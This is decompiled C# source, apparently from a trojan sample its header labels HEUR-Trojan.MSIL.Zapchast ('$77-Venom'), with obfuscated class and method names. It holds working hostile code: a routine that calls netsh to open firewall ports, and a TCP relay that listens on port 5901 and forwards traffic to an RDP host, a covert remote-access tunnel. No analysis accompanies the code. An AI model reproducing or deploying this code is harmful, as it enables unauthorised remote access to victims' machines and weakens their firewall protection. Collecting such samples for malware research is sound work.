// Decompiled with JetBrains decompiler
// Type: 蛹㹵쳠ậНꄐ⇕寧ᖒ옷佸ശ계䨕�쀭
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

public class 蛹㹵쳠\uE038ậН\uE9DFꄐ\u21D5寧ᖒ\uECA4옷佸ശ\uF008계䨕\uFFFD쀭
{
  public static void ಔㅑȿ֟趞曌Ꮡ鸻彅쨉잧鰾ቷ绵㹭莐\u2867ꉤㄖ맕(int port, bool tcp, bool udp, string name)
  {
    if (tcp)
      Process.Start("netsh.exe", "firewall add  portopening TCP " + port.ToString() + name);
    if (!udp)
      return;
    Process.Start("netsh.exe", "firewall add  portopening UDP " + port.ToString() + name);
  }

  public static void 쉗껳鰪姖䑰퀡礙좉賈揽\u2F0B\uF002ͬ\u22F4ꯪ쉤俥ዟ㣟玊()
  {
    int port1 = 5901;
    int port2 = 5901;
    int size1 = 65536;
    try
    {
      string ipString;
      using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
      {
        socket.Connect("8.8.8.8", 65530);
        ipString = (socket.LocalEndPoint as IPEndPoint).Address.ToString();
      }
      Console.WriteLine("Starting up...");
      IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(ipString), port2);
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("192.168.1.90"), port1);
      Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      Console.WriteLine("Listening for connection ...");
      socket2.Bind((EndPoint) localEP);
      socket2.Listen(1);
      Socket socket3 = socket2.Accept();
      socket1.Connect((EndPoint) remoteEP);
      byte[] numArray = (byte[]) null;
      while (true)
      {
        byte[] buffer1 = new byte[size1];
        int size2 = socket3.Receive(buffer1, size1, SocketFlags.None);
        Console.WriteLine("Received {0} bytes from redir port. Sennding to RDP port.", (object) size2);
        Console.WriteLine("Sent {0} bytes to RDP. Waiting for response...", (object) socket1.Send(buffer1, size2, SocketFlags.None));
        numArray = (byte[]) null;
        byte[] buffer2 = new byte[size1];
        int size3 = socket1.Receive(buffer2, size1, SocketFlags.None);
        Console.WriteLine("Received {0} bytes from RDP. Sending to redir port", (object) size3);
        Console.WriteLine("Sent {0} bytes to redirPort.  Waiting for response...", (object) socket3.Send(buffer2, size3, SocketFlags.None));
        numArray = (byte[]) null;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception: " + ex.Message);
    }
  }
}
